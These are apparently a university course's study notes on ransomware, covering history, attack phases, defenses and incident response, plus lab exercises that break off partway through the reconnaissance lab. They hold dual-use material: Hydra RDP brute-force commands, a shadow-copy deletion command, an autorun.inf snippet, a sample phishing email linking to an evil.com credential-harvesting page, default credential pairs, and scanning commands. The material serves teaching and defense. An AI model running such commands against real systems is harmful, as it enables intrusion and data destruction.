# Ransomware & Cybersecurity: Complete Study Notes

## https://youtu.be/k1bL7hsbg_E

### Hacking Books Course — University Cybersecurity Department

> **Lab Scope:** All practical exercises are scoped to authorized environments only:
> your own MERN/PERN test websites, Metasploitable2 in VirtualBox/VMware on Parrot OS,
> and isolated local lab machines. Never test on systems you do not own or have explicit written permission to test.

---

## 📋 Table of Contents

1. [What Is Ransomware?](#1-what-is-ransomware)
2. [Evolution of Ransomware: Single → Double → Triple Extortion](#2-evolution-of-ransomware-single--double--triple-extortion)
3. [Why Ransomware Dominates Cybercrime](#3-why-ransomware-dominates-cybercrime)
4. [The Business Cost Model of a Ransomware Attack](#4-the-business-cost-model-of-a-ransomware-attack)
5. [Ransomware as a Service (RaaS)](#5-ransomware-as-a-service-raas)
6. [Debunking Common Myths](#6-debunking-common-myths)
7. [History of Ransomware (1989 → Present)](#7-history-of-ransomware-1989--present)
8. [Anatomy of a Ransomware Attack: Three Phases](#8-anatomy-of-a-ransomware-attack-three-phases)
   - [Phase 1: Access / Reconnaissance](#phase-1-access--reconnaissance)
   - [Phase 2: Data Collection / Lateral Movement](#phase-2-data-collection--lateral-movement)
   - [Phase 3: Encryption / Detonation](#phase-3-encryption--detonation)
9. [Attack Vectors In-Depth](#9-attack-vectors-in-depth)
   - [Phishing Emails](#91-phishing-emails)
   - [RDP Brute Force](#92-rdp-brute-force)
   - [Drive-By Downloads](#93-drive-by-downloads)
   - [USB Drop Attacks](#94-usb-drop-attacks)
   - [Unpatched Network Devices](#95-unpatched-network-devices)
10. [Defensive Countermeasures](#10-defensive-countermeasures)
11. [Password Security & MFA](#11-password-security--mfa)
12. [Incident Response Plan](#12-incident-response-plan)
13. [Paying the Ransom: Decision Framework](#13-paying-the-ransom-decision-framework)
14. [Recovery & Hardening Post-Attack](#14-recovery--hardening-post-attack)
15. [Comprehensive Lab Exercises](#15-comprehensive-lab-exercises)
    - [Lab 1: Recon & Scanning (Metasploitable2)](#lab-1-recon--scanning-metasploitable2)
    - [Lab 2: Phishing Simulation (Your Test Websites)](#lab-2-phishing-simulation-your-test-websites)
    - [Lab 3: RDP / SSH Brute Force](#lab-3-rdp--ssh-brute-force)
    - [Lab 4: Lateral Movement & Privilege Escalation](#lab-4-lateral-movement--privilege-escalation)
    - [Lab 5: Ransomware Behavior Analysis (Isolated VM)](#lab-5-ransomware-behavior-analysis-isolated-vm)
    - [Lab 6: Backup & Recovery Drill](#lab-6-backup--recovery-drill)
    - [Lab 7: Web App Vulnerability Testing (Your MERN/PERN Sites)](#lab-7-web-app-vulnerability-testing-your-mernpern-sites)
16. [Glossary](#16-glossary)
17. [Certifications & Further Learning](#17-certifications--further-learning)

---

## 1. What Is Ransomware?

Ransomware is a class of malware that **encrypts all reachable data** on an infected system, then demands payment (ransom) in exchange for the decryption key.

### How It Differs from a Standard Data Breach

| Dimension         | Traditional Data Breach       | Ransomware                        |
| ----------------- | ----------------------------- | --------------------------------- |
| Attacker's goal   | Steal and resell data         | Encrypt and extort                |
| Market dependency | Needs a buyer for stolen data | Victim is always the buyer        |
| Victim notice     | Often weeks or months later   | Immediate — loud ransom note      |
| Recovery path     | Regulatory fines, PR damage   | Pay ransom OR restore from backup |
| Anonymity tool    | Not critical                  | Bitcoin / Monero essential        |

### What Gets Encrypted

```
Typical ransomware targets:
  ├── Documents       (.docx, .pdf, .xlsx, .txt)
  ├── Databases       (.sql, .mdb, .accdb, MongoDB files)
  ├── Photos/Media    (.jpg, .png, .mp4, .psd)
  ├── Source Code     (.js, .py, .java, .env — your MERN/PERN projects!)
  ├── Backups         (.bak, .zip, shadow copies)
  └── Network Shares  (mapped drives, SMB shares, NAS)
```

### Post-Encryption Behavior

After encrypting all reachable files, ransomware:

1. Drops a **ransom note** (`README.txt`, `DECRYPT_INSTRUCTIONS.html`) in every folder
2. Changes the **desktop wallpaper** to the ransom demand
3. Opens a countdown timer (commonly 72 hours before price doubles or data is deleted)
4. Provides a `.onion` link (Tor) or email address for payment instructions

---

## 2. Evolution of Ransomware: Single → Double → Triple Extortion

```
┌─────────────────────────────────────────────────────────────────┐
│                    RANSOMWARE EXTORTION TIERS                   │
├─────────────────────────────────────────────────────────────────┤
│  TIER 1 — Single Extortion                                      │
│  ┌──────────────────┐                                           │
│  │  Encrypt Files   │──► Pay to decrypt                        │
│  └──────────────────┘                                           │
├─────────────────────────────────────────────────────────────────┤
│  TIER 2 — Double Extortion (2020+)                              │
│  ┌──────────────────┐    ┌───────────────────────┐             │
│  │  Steal Data FIRST│──► │  THEN Encrypt Files   │             │
│  └──────────────────┘    └───────────────────────┘             │
│  Leverage: "Pay or we publish your data publicly"               │
├─────────────────────────────────────────────────────────────────┤
│  TIER 3 — Triple Extortion (2021+)                              │
│  ┌──────────────────┐    ┌─────────────────┐    ┌───────────┐  │
│  │  Steal Data      │──► │  Encrypt Files  │──► │ Target    │  │
│  └──────────────────┘    └─────────────────┘    │ Customers │  │
│                                                  │ & Patients│  │
│                                                  └───────────┘  │
│  Leverage: Direct extortion of the victim's own clients         │
└─────────────────────────────────────────────────────────────────┘
```

**Key insight for defenders:** By the time ransomware detonates (Phase 3), the attacker has likely already been inside your network for weeks or months, exfiltrating data. The encryption is the _final_ act, not the whole attack.

---

## 3. Why Ransomware Dominates Cybercrime

| Stat                      | Value                                                        |
| ------------------------- | ------------------------------------------------------------ |
| Attack frequency          | Every **11 seconds** an organization is hit                  |
| Industry size             | **Multi-billion dollar** criminal industry                   |
| Government classification | Some attacks classified as **acts of terrorism**             |
| Profit-to-risk ratio      | **Extremely high profit, very low risk** for attackers       |
| Visibility                | For every high-profile case, **hundreds** of SMBs stay quiet |

### Economic Forces Driving Growth

1. **Bitcoin (2009):** Created an anonymous, untraceable payment rail. Without it, ransomware would not scale.
2. **RaaS model:** Lowers the technical barrier; developers license malware to non-technical affiliates.
3. **IoT explosion:** Billions of insecure devices expand the attack surface.
4. **Remote work:** Blurred security perimeters massively increase exposure.
5. **Under-reporting:** Companies prefer silence over reputational damage, emboldening attackers.

---

## 4. The Business Cost Model of a Ransomware Attack

```
TOTAL COST OF A RANSOMWARE ATTACK
══════════════════════════════════════════════════════

  ① Ransom Payment Itself
      Attackers research your revenue, cyber insurance
      coverage, and financial data to calibrate the ask.
      They've read your books before you even knew they
      were inside.

  ② Downtime & Lost Revenue
      Average: 12.6 days of inability to operate
      Productivity, sales, SLAs all impacted.

  ③ Regulatory & Legal Fines
      GDPR: Must notify authorities within 72 hours
      HIPAA, PCI-DSS etc. carry their own penalties
      for stolen data.

  ④ Reputational Damage
      1 in 4 Americans stops doing business with
      a hacked company.

  ⑤ Rising Insurance Premiums
      Post-incident, cyber insurance costs spike.
      Some insurers invoke "acts of war" clauses and
      refuse payout entirely (e.g., NotPetya 2017).

  ⑥ Post-Recovery Costs
      Pen testing, new security tooling, staff training,
      PR/legal consultants, IT rebuild.

══════════════════════════════════════════════════════
  NOTE: 25% of organizations shut down after a
  significant ransomware attack.
```

---

## 5. Ransomware as a Service (RaaS)

### Traditional Model vs. RaaS

```
TRADITIONAL (Solo Hacker)
━━━━━━━━━━━━━━━━━━━━━━━━━━━
  1 person: writes malware
           writes phishing emails
           delivers payload
           manages decryption
           collects ransom
  Bottleneck: one person can only run so many attacks

RANSOMWARE AS A SERVICE (Affiliate Model)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ┌──────────────┐    License/Lease
  │   Developer  │──────────────────────────────────┐
  │  (writes     │                                  ▼
  │   malware)   │               ┌──────────────────────────┐
  └──────────────┘               │     Affiliates           │
                                 ├──────────────────────────┤
                                 │ Specialist A: Coding     │
                                 │ Specialist B: Phishing   │
                                 │ Specialist C: Network    │
                                 │             Intrusion    │
                                 └──────────────────────────┘
                                          │ Pay ransom
                                          ▼
                               Developer: 60% cut
                               Affiliate: 40% cut
```

The Cerber ransomware (one of the most active strains, covered in the course demo) used exactly this model and netted approximately **$2.3 million** in ransom fees. At its peak it accounted for over 25% of all infections.

---

## 6. Debunking Common Myths

### Myth 1: "Why would anyone hack me? I have nothing of interest."

**Reality:**

- You don't need to have interesting data — you just need to _want your data back_.
- Attackers don't discriminate by size; they attack anyone with a chance of payment.
- Home users are high-value targets for family photos, personal documents, and sentimental data.
- SMBs are disproportionately targeted because they have weaker security than enterprises.

### Myth 2: "It was a sophisticated attack — nothing we could have done."

**Reality:**

- Truly sophisticated (zero-day) attacks are **rare**.
- The vast majority of breaches trace back to:
  - Someone clicking a phishing link
  - Unpatched software
  - Exposed RDP with weak passwords
  - Default credentials left unchanged
- Calling every breach "sophisticated" undermines defensive investment and excuses poor hygiene.
- **Analogy:** Leaving your windows open and then calling it a "sophisticated break-in" when someone climbs through.

> **Key principle:** Plan for failures. Expect humans to click phishing emails. Assume breach. Build resilience, not just prevention.

---

## 7. History of Ransomware (1989 → Present)

```
RANSOMWARE TIMELINE
═══════════════════════════════════════════════════════════════════

  1989 — AIDS Trojan (PC Cyborg)
  ├── Creator: Biologist Joseph Popp
  ├── Vector: Floppy disk distributed at WHO AIDS conference
  ├── Trigger: After 90 reboots
  ├── Encryption: Weak symmetric cipher (easily reversed)
  └── Payment: Postal mail to a P.O. box in Panama

  2006 — GPCoder
  ├── Early public-key encryption attempt
  └── Eastern European origin

  2009 — BITCOIN INTRODUCED ← PIVOTAL MOMENT
  └── Anonymous, decentralized payment = ransomware becomes viable at scale

  2010 — Crytocker Precursors
  └── Prepaid debit card ransom payments still used

  2013 — CryptoLocker
  ├── First major use of Bitcoin for ransom
  ├── Used RSA public-key encryption (unbreakable without private key)
  ├── 72-hour countdown timer (later changed to price increase)
  └── Netted approx. $30 million USD

  2015–2017 — RaaS Explosion
  ├── Cerber: RaaS model, 25%+ of infections, $2.3M revenue
  ├── Locky, WannaCry, Ryuk emerge
  └── RDP exploitation becomes primary vector

  2017 — NotPetya (State-Sponsored)
  ├── Deployed by Russian military against Ukraine
  ├── Disguised as ransomware (ransom note visible) — was a WIPER
  ├── Spread globally to unintended targets
  ├── Estimated $10 BILLION in global damages
  └── Cyber insurers invoked "acts of war" clause — no payouts

  2020+ — Double/Triple Extortion Era
  ├── Data theft before encryption becomes standard
  ├── REvil, DarkSide, Conti, LockBit emerge
  └── Critical infrastructure (pipelines, hospitals) targeted

  2021+ — Government Response
  └── Ransomware attacks classified as acts of terrorism by some governments

═══════════════════════════════════════════════════════════════════
```

---

## 8. Anatomy of a Ransomware Attack: Three Phases

```
HIGH-LEVEL ATTACK FLOW
═══════════════════════════════════════════════════════════════════

  PHASE 1: ACCESS           PHASE 2: DWELL              PHASE 3: DETONATE
  (Reconnaissance)          (Lateral Movement)          (Encryption)
  ┌─────────────────┐       ┌─────────────────┐        ┌───────────────┐
  │ Phishing emails │       │ Credential dump │        │ Ransomware    │
  │ RDP scanning    │──────►│ Priv escalation │───────►│ deployed      │
  │ Vuln scanning   │       │ Data exfil      │        │ Files locked  │
  │ USB drops       │       │ Backdoor plant  │        │ Ransom note   │
  │ Drive-by DL     │       │ Recon network   │        │ posted        │
  └─────────────────┘       └─────────────────┘        └───────────────┘
        Weeks/months dwell time before detonation ──────────────────►

  DEFENDER FOCUS:   ◄─── Most ROI here ───────────────────────────►
  (Stop them early; by Phase 3 it's already too late for data)

═══════════════════════════════════════════════════════════════════
```

---

### Phase 1: Access / Reconnaissance

The attacker's goal is to gain a **single foothold** on the network. Key methods:

**Phishing (91% of all cyberattacks start here):**

- Craft emails creating urgency (fake invoice, account suspension, HR notice)
- Attach malware disguised as PDF, Word macro, or Excel file
- Password-protect the attachment to bypass AV filters (password in email body)
- Link to spoofed login page to harvest credentials

**RDP Scanning:**

- Scan the internet with Shodan for exposed port 3389
- Brute-force with password dictionaries (top 1M passwords → 33% success rate)
- Use harvested credentials from phishing

**Vulnerability Exploitation:**

- When a CVE patch drops, attackers immediately scan for unpatched systems
- Network devices (routers, firewalls, VPNs) are prime targets

**Drive-By Downloads:**

- Malicious website silently exploits unpatched browser vulnerabilities
- User doesn't click anything — just visiting the site installs malware

**USB Drops:**

- Drop infected USB sticks in parking lots, reception areas
- Human curiosity does the rest

**Insider / Social Engineering:**

- Directly contact dissatisfied employees (as in the car company example)
- Offer financial incentive to physically plug in a device

---

### Phase 2: Data Collection / Lateral Movement

Once inside, the attacker moves **quietly** — often lurking for weeks or months.

```
POST-COMPROMISE ATTACKER WORKFLOW
═══════════════════════════════════════════════════════
  Initial foothold gained (e.g., phished workstation)
           │
           ▼
  Credential dumping tools (Mimikatz, etc.)
  → Harvest local admin passwords
           │
           ▼
  Lateral movement across network (PsExec, WMI, RDP)
  → Move to more valuable systems
           │
           ▼
  Network enumeration
  → Find file shares, databases, backup systems
           │
           ▼
  Data exfiltration
  → Package and upload sensitive data to C2
  → This is the double extortion leverage
           │
           ▼
  Backup sabotage (if possible)
  → Delete shadow copies, corrupt backup jobs
           │
           ▼
  Deploy ransomware payload (Phase 3)
═══════════════════════════════════════════════════════
```

**Real example from course:** In a negotiation screenshot between a British fashion outlet and attackers, the attacker _knew exactly how much cyber insurance the company carried_ and used that figure in their ransom demand. They had read the company's internal documents.

---

### Phase 3: Encryption / Detonation

The ransomware payload is deployed. At this point:

- RSA/AES hybrid encryption locks all files (computationally impossible to break without the key)
- Shadow Volume Copies (Windows) deleted with `vssadmin delete shadows /all /quiet`
- Ransom note deposited in every folder and on the desktop
- Wallpaper changed
- Countdown timer activated

**The attacker has already won by this point** — data has been copied. Encryption is just the monetization trigger.

---

## 9. Attack Vectors In-Depth

### 9.1 Phishing Emails

**Anatomy of a Phishing Email:**

```
FROM:    "IT Support" <it-helpdesk@c0mpanyname.com>   ← typosquat domain
TO:      employee@realcompany.com
SUBJECT: [URGENT] Your account will be suspended in 24 hours

Dear Employee,

We have detected unusual activity on your account. You must
verify your identity immediately to avoid suspension.

[CLICK HERE TO VERIFY]  ←── links to: http://realcompany-login.evil.com
                              (credential harvesting page)

Alternatively, open the attached security report for details.
[SecurityReport.pdf.exe]  ←── double extension malware

IT Security Team
```

**Psychological Triggers Used:**

- **Urgency:** "24 hours", "immediate action required"
- **Authority:** fake IT team, fake CEO (BEC - Business Email Compromise)
- **Fear:** account suspension, legal notice, tax audit
- **Curiosity:** "You have received a package", "Someone shared a file with you"
- **Greed:** financial offer to insider

**Spear Phishing vs. Mass Phishing:**

| Type           | Target             | Personalization   | Success Rate                 |
| -------------- | ------------------ | ----------------- | ---------------------------- |
| Mass Phishing  | Everyone           | None              | Low per email, high at scale |
| Spear Phishing | Specific person    | High (uses OSINT) | Much higher                  |
| Whaling        | C-suite executives | Very high         | Extremely high               |
| Vishing        | Phone call         | Variable          | High (social)                |
| Smishing       | SMS                | Low-medium        | Growing                      |

---

### 9.2 RDP Brute Force

**Remote Desktop Protocol (RDP):** Allows full remote control of a Windows system, as if sitting in front of it.

**Attack flow:**

```bash
# Step 1: Find exposed RDP instances (Shodan)
# Search query on shodan.io: port:3389 country:BD
# Returns millions of results globally

# Step 2: Brute force with Hydra (authorized lab machines only)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  rdp://TARGET_IP -t 4 -V

# Step 3: Or use credential stuffing with known dumps
hydra -C /path/to/credential_combo_list.txt rdp://TARGET_IP
```

**Why it works:**

- Shodan found over 3.5 million exposed RDP endpoints globally
- 33% success rate using top 1 million passwords
- Many organizations use RDP without NLA (Network Level Authentication)
- Default admin credentials still common

**Defenses:**

- Never expose RDP directly to the internet — use VPN first
- Enable NLA (Network Level Authentication)
- Set account lockout policies (5 attempts → 30 min lockout)
- Use non-standard port (security through obscurity, not sufficient alone)
- Enable MFA on RDP via Duo, Azure AD, etc.

---

### 9.3 Drive-By Downloads

A **drive-by download** installs malware when a user simply visits a malicious (or compromised legitimate) website — no click required.

**Technical mechanism:**

1. Attacker compromises a legitimate website OR hosts their own malicious site
2. Page loads a browser exploit kit (e.g., exploiting an unpatched Chrome/Firefox vulnerability)
3. Exploit silently executes shellcode in the browser context
4. Shellcode downloads and executes the malware payload
5. User sees a normal (or blank) webpage — nothing suspicious

**Mitigation:**

- Keep browsers updated (auto-update enabled)
- Use uBlock Origin / ad blockers (many exploits come via malvertising)
- Enable Enhanced Protection in Chrome
- Disable JavaScript for untrusted sites (NoScript)
- Use a sandboxed browser environment

---

### 9.4 USB Drop Attacks

**Attack flow:**

1. Attacker loads malware onto a USB drive
2. Creates a file named something enticing: `Salary_List_2024.xlsx`, `Company_Passwords.docx`
3. Drops 1–2 USBs in the target organization's parking lot, restroom, lobby
4. Employee finds it, plugs it into their work computer
5. AutoPlay (or a fake file icon exploiting LNK vulnerability) executes malware

**Autorun exploit example (historical, now patched by default in Windows):**

```
[autorun]
open=malware.exe
icon=usb.ico
```

**Modern USB attack vectors:**

- **Rubber Ducky / O.MG Cable:** Emulates a keyboard, types attack commands at 1000 WPM
- **USBKill:** Sends high voltage pulses to fry the system (physical attack)
- **HID attacks:** USB poses as Human Interface Device

**Defenses:**

- Disable AutoPlay/AutoRun globally via Group Policy
- Block unknown USB devices via endpoint control (e.g., CrowdStrike, Symantec)
- Security awareness training: do not plug in unknown USBs

---

### 9.5 Unpatched Network Devices

When a vendor releases a patch for a CVE (Common Vulnerability and Exposure), attackers immediately begin scanning for vulnerable instances **before** organizations apply the patch.

```
Timeline of exploitation after CVE disclosure:
Day 0: CVE published, patch released
Day 1: Exploit code appears on GitHub/Exploit-DB
Day 3: Mass automated scanning begins
Day 7: Many organizations haven't patched yet
Day 30+: Unpatched organizations are actively exploited
```

**Common attack targets:**

- VPN appliances (Fortinet, Pulse Secure, Citrix)
- Firewalls (Palo Alto, SonicWall)
- Web servers (Apache, Nginx, IIS)
- Content Management Systems (WordPress plugins, etc.)
- IoT devices (cameras, printers, smart devices)

---

## 10. Defensive Countermeasures

### The Defense-in-Depth Model

```
LAYERED SECURITY (DEFENSE IN DEPTH)
════════════════════════════════════════════════════════════
  Layer 7: HUMAN
    └── Security awareness training, phishing simulations,
        culture of reporting, least privilege mindset

  Layer 6: POLICIES & PROCEDURES
    └── Incident response plan, patch schedule, access control
        policies, acceptable use policy, vendor management

  Layer 5: NETWORK SEGMENTATION
    └── Separate IoT, guest WiFi, staff, servers
        Firewalls between segments
        VLAN isolation

  Layer 4: ENDPOINT SECURITY
    └── EDR (Endpoint Detection & Response)
        Antivirus (not sufficient alone, but necessary)
        Application whitelisting
        Disable admin rights for standard users

  Layer 3: IDENTITY & ACCESS
    └── Strong unique passwords + password manager
        MFA everywhere (VPN, email, RDP, cloud)
        Least privilege access model
        PAM (Privileged Access Management)

  Layer 2: PATCH MANAGEMENT
    └── Automated patch deployment
        Vulnerability scanner (Nessus, OpenVAS)
        Reduced attack surface (uninstall unused software)

  Layer 1: BACKUP & RECOVERY
    └── 3-2-1 backup rule
        Offline backups
        Regular restore tests
        Air-gapped backups
════════════════════════════════════════════════════════════
```

### 3-2-1 Backup Rule

```
3 copies of data
  ├── 2 on different media types (e.g., SSD + NAS)
  │     └── 1 offsite / cloud (protects against fire/theft)
  └── 1 offline / air-gapped (protects against ransomware)
```

**Critical point:** Cloud sync (Google Drive, OneDrive) is **NOT a backup**. Ransomware encrypts locally and the sync propagates encrypted files to the cloud within seconds.

### Network Segmentation Diagram

```
SEGMENTED NETWORK ARCHITECTURE
═══════════════════════════════════════════════════════════

  INTERNET
     │
     ▼
  [FIREWALL / UTM]
     │
     ├──► CORPORATE NETWORK SEGMENT
     │       ├── File Servers
     │       ├── Databases
     │       ├── Domain Controllers
     │       └── Management Workstations
     │
     ├──► STAFF WORKSTATION SEGMENT (VLAN 10)
     │       └── Cannot directly access servers —
     │           must go through firewall rules
     │
     ├──► GUEST / IoT SEGMENT (VLAN 20)
     │       └── Internet only — no internal access
     │
     └──► DMZ (DEMILITARIZED ZONE)
             └── Public-facing web servers, mail relays
                 (compromise here ≠ compromise of internals)
```

### Patch Management Best Practice

```
PATCHING WORKFLOW
═════════════════════════════════════════════════════
  CVE Published
       │
       ▼
  Assess severity (CVSS score)
  CVSS 9.0+ = Critical → patch within 24–48 hours
  CVSS 7.0+ = High    → patch within 7 days
  CVSS 4.0+ = Medium  → patch within 30 days
       │
       ▼
  Test on non-production server first
       │
       ▼
  Deploy to production with rollback plan
       │
       ▼
  Verify with vulnerability scanner (OpenVAS/Nessus)
       │
       ▼
  Document and close change ticket
═════════════════════════════════════════════════════
```

### Least Privilege Access

```
ROLE-BASED ACCESS EXAMPLE
═══════════════════════════════════════════════════════════
  Role              │ Access Level
  ──────────────────┼──────────────────────────────────────
  Cashier           │ POS system only — NOT financial records
  HR Staff          │ HR database — NOT customer data
  Developer         │ Dev/staging servers — NOT production DB
  IT Admin          │ Full access — with MFA + audit logging
  CEO               │ Executive dashboards — NOT patient records
  Guest             │ Internet only
═══════════════════════════════════════════════════════════
Key: If ransomware compromises a cashier's account, it can
only encrypt what the cashier can access. Least privilege
contains the blast radius.
```

---

## 11. Password Security & MFA

### Password Anti-Patterns to Avoid

| Bad Practice                           | Why It Fails                                          |
| -------------------------------------- | ----------------------------------------------------- |
| `password123`                          | In every wordlist                                     |
| `Company2024!`                         | Predictable pattern                                   |
| Reusing one strong password everywhere | Credential stuffing — one breach exposes all accounts |
| Writing passwords on sticky notes      | Physical exposure                                     |
| Storing in plain text file             | Malware / file-share access                           |

### Passphrases vs. Passwords

```
Weak password:    P@ssw0rd1!
                  → 9 chars, predictable substitutions
                  → Common in wordlists
                  → Cracks in minutes

Strong passphrase: correct-horse-battery-staple-77!
                   → 31 chars, easy to remember
                   → Astronomical brute-force time
                   → Not in any wordlist
```

### Password Manager Setup

**Recommended tools:** Bitwarden (open source, free), 1Password, LastPass

```
HOW A PASSWORD MANAGER WORKS
══════════════════════════════════════════════════════
  You remember: ONE master passphrase (strong)
       │
       ▼
  Master passphrase unlocks: VAULT (AES-256 encrypted)
       │
       ├── Amazon:    xK9#mP$vL2@qR (auto-generated, unique)
       ├── GitHub:    tY7&nQ!hW4@jM  (auto-generated, unique)
       ├── Gmail:     wZ3*pS#eX8@kN  (auto-generated, unique)
       └── VPN:       rN5^oA@fV1#mB  (auto-generated, unique)

  Vault syncs to cloud (encrypted) → available on all devices
  Company cannot see your passwords (zero-knowledge architecture)
══════════════════════════════════════════════════════
```

### Multi-Factor Authentication (MFA)

**Authentication factors:**

- **Something you know:** password, PIN
- **Something you have:** phone (TOTP app), hardware key (YubiKey)
- **Something you are:** fingerprint, face ID

**TOTP (Time-based One-Time Password) flow:**

```
1. Server and your app share a secret seed during setup
2. Every 30 seconds, both compute: TOTP = HMAC(seed, unix_time / 30)
3. At login: enter password → enter 6-digit TOTP code
4. Even if attacker has your password, they can't log in without your phone
```

**MFA Apps:** Google Authenticator, Authy, Microsoft Authenticator

**Priority accounts for MFA:**

1. Email (primary attack target — password resets go here)
2. VPN
3. Cloud platforms (AWS, Azure, GCP)
4. Password manager
5. Financial accounts
6. Domain registrar / DNS provider

### Default Credentials — The IoT Problem

The Mirai botnet (2016) enslaved **600,000+ IoT devices** using only 60 common default passwords. Examples:

```
admin:admin
admin:password
root:root
admin:(blank)
root:1234
```

**Action:** Change default credentials on every device before connecting it to the internet.

---

## 12. Incident Response Plan

### IR Team Roles

```
INCIDENT RESPONSE TEAM STRUCTURE
═══════════════════════════════════════════════════════
  Role                  Responsibility
  ──────────────────────┼──────────────────────────────
  IR Lead               │ Overall coordination, decisions
  IT/Sys Admin          │ Technical containment, recovery
  Legal Counsel         │ Regulatory compliance, liability
  PR / Communications   │ Internal/external messaging
  Finance               │ Ransom payment authorization
  Executive Sponsor     │ Business continuity decisions
  Cyber Insurer Contact │ Policy coverage, requirements
  Law Enforcement       │ Evidence, investigation liaison
═══════════════════════════════════════════════════════
```

### Response Phases

```
INCIDENT RESPONSE WORKFLOW
═══════════════════════════════════════════════════════════════

  ① DETECT
    └── Ransom note observed, AV alert, user reports
        anomalous behavior, SOC alert fires

  ② CONTAIN
    └── Immediately:
        - Physically disconnect network cables from infected machines
        - Disable WiFi on affected devices
        - Isolate infected VLAN segments at the switch
        - Do NOT power off (forensic memory artifacts lost)
        - Do NOT wipe (evidence needed)

  ③ ASSESS
    └── What business functions still work?
        What systems are encrypted vs. accessible?
        How far has it spread?
        What data was stolen / encrypted?
        How sensitive is the affected data?

  ④ COMMUNICATE
    └── Internal: Set expectations (avg. 12.6 days downtime)
        Regulatory: GDPR requires notification within 72 hours
        External: Engage PR/legal before public statements
        Law enforcement: Report for record-keeping

  ⑤ RECOVER (PARALLEL TRACKS)
    ├── Track A: Restore from backup
    │     - Validate backup integrity
    │     - Determine recovery point (what's the last clean backup?)
    │     - Prioritize critical systems first
    │     - Test restored data before relying on it
    │
    └── Track B: Negotiate with attacker (if backup recovery insufficient)
          - Engage cyber insurer first (required before payment)
          - Consider professional negotiators
          - Verify decryptor works on sample files before paying
          - Check for free decryptors (nomoreransom.org)

  ⑥ HARDEN
    └── Change all passwords, enforce MFA
        Patch everything
        Pen test
        Update IR plan with lessons learned

═══════════════════════════════════════════════════════════════
```

### GDPR Compliance During an Incident

| Requirement             | Detail                                                                                               |
| ----------------------- | ---------------------------------------------------------------------------------------------------- |
| Notification deadline   | Within **72 hours** of becoming aware                                                                |
| Who to notify           | Supervisory authority (e.g., ICO in UK, PDPA in BD)                                                  |
| What to include         | Nature of breach, categories of data, estimated people affected, likely consequences, measures taken |
| If notification delayed | Must provide reasons for delay                                                                       |

---

## 13. Paying the Ransom: Decision Framework

```
RANSOM PAYMENT DECISION TREE
═══════════════════════════════════════════════════════════════

  Are clean backups available and recoverable?
  ├── YES → Restore from backup (preferred path)
  └── NO  →
        │
        Is a free decryptor available? (nomoreransom.org)
        ├── YES → Use it (test on sample first)
        └── NO  →
              │
              Is paying legal in your jurisdiction?
              ├── NO  → Cannot pay (consult legal)
              └── YES →
                    │
                    Consult cyber insurer FIRST
                    (paying without notification may void coverage)
                    │
                    Negotiate (professional negotiators can
                    reduce demand significantly)
                    │
                    Verify decryptor on test file BEFORE paying
                    │
                    Understand: payment does NOT guarantee:
                    - Working decryptor
                    - Data deletion (it won't be)
                    - No future attacks (80% re-attack rate)

═══════════════════════════════════════════════════════════════
```

**Key facts about paying:**

- 80% of organizations that pay are attacked again
- Getting the decryptor doesn't auto-restore everything — manual process per machine
- Organizations with 100s of encrypted systems have spent 4–5 months decrypting after payment
- The attacker may simply not deliver the key (especially nation-state actors like NotPetya)
- Paying funds further criminal activity

---

## 14. Recovery & Hardening Post-Attack

### Post-Attack Statistics

| Outcome                  | Percentage of Organizations |
| ------------------------ | --------------------------- |
| Significant revenue loss | 66%                         |
| Reputational damage      | 53%                         |
| Permanently shut down    | 25%                         |
| Suffered a repeat attack | **80%**                     |

### Post-Incident Hardening Checklist

```
POST-INCIDENT HARDENING CHECKLIST
═══════════════════════════════════════════════════════
  □ Change ALL passwords on ALL devices (not just affected ones)
  □ Enforce MFA on all accounts (VPN, email, admin portals)
  □ Audit and remove all unauthorized accounts / backdoors
  □ Full vulnerability scan (Nessus / OpenVAS)
  □ Patch everything — prioritize by CVSS score
  □ Review and improve email filtering rules
  □ Conduct mandatory phishing awareness training for all staff
  □ Penetration test by external firm
  □ Review and improve backup processes + test restores
  □ Update incident response plan with lessons learned
  □ Review least-privilege access policies
  □ Engage legal/PR to address regulatory and reputational fallout
  □ Review cyber insurance coverage and requirements
  □ Recognize and debrief the response team
═══════════════════════════════════════════════════════
```

---

## 15. Comprehensive Lab Exercises

> ⚠️ **LEGAL & ETHICAL NOTICE**
> All labs below must be conducted **only** on:
>
> - Your own MERN/PERN web applications running locally
> - Metasploitable2 in an isolated VM on your Parrot OS host
> - Your own test machines with no outbound network access
>
> Never scan, probe, or exploit any system without explicit written authorization.
> Unauthorized access is illegal under the Computer Misuse Act, CFAA, and equivalent laws globally.

---

### Lab 1: Recon & Scanning (Metasploitable2)

**Objective:** Understand the reconnaissance phase from an attacker's perspective.

**Environment setup:**

```bash
# Parrot OS host + Metasploitable2 VM
# Ensure both are on a host-only or NAT network — NO internet access

# Get Metasploitable2 IP
# In Metasploitable2 terminal:
ifconfig

# From Parrot OS, confirm connectivity
ping <METASPLOITABLE_IP>
```

**Step 1: Network Discovery**

```bash
# Discover live hosts on local subnet
nmap -sn 192.168.56.0/24

# Quick port scan
nmap -sS -T4 <METASPLOITABLE_IP>

# Full comprehensive scan
nmap -sV -sC -A -p- -T4 <METASPLOITABLE_IP> -oN metasploitable_full_scan.txt

# Flags explained:
# -sS   = SYN stealth scan (half-open, less noisy)
# -sV   = detect service versions
# -sC   = run default NSE scripts
# -A    = OS detection, version, traceroute
# -p-   = all 65535 ports
# -oN   = save output to file
```

**Step 2: Enumerate Services**

```bash
# Enumerate HTTP (port 80)
nikto -h http://<METASPLOITABLE_IP>

# Enumerate SMB (port 139/445)
enum4linux -a <METASPLOITABLE_IP>
nmap --script smb-enum-shares,smb-enum-users <METASPLOITABLE_IP>

# Enumerate FTP (port 21) — check for anonymous login
nmap --script ftp-anon,ftp-syst -p 21 <METASPLOITABLE_IP>

# Enumerate SSH
nmap --script ssh-auth-methods -p 22 <METASPLOITABLE_IP>
```

**Step 3: Web Application Recon**

```bash
# Directory/file brute force
gobuster dir -u http://<METASPLOITABLE_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt

# Alternative: feroxbuster (faster, recursive)
feroxbuster -u http://<METASPLOITABLE_IP> -r -t 50

# Check robots.txt and sitemap manually
curl http://<METASPLOITABLE_IP>/robots.txt
curl http://<METASPLOITABLE_IP>/sitemap.xml
```

**Step 4: OSINT Techniques (for understanding real-world recon)**

```bash
# Shodan CLI (requires API key — use web interface for free)
shodan search "port:3389 country:BD"
shodan host <IP>

# theHarvester — email/domain OSINT
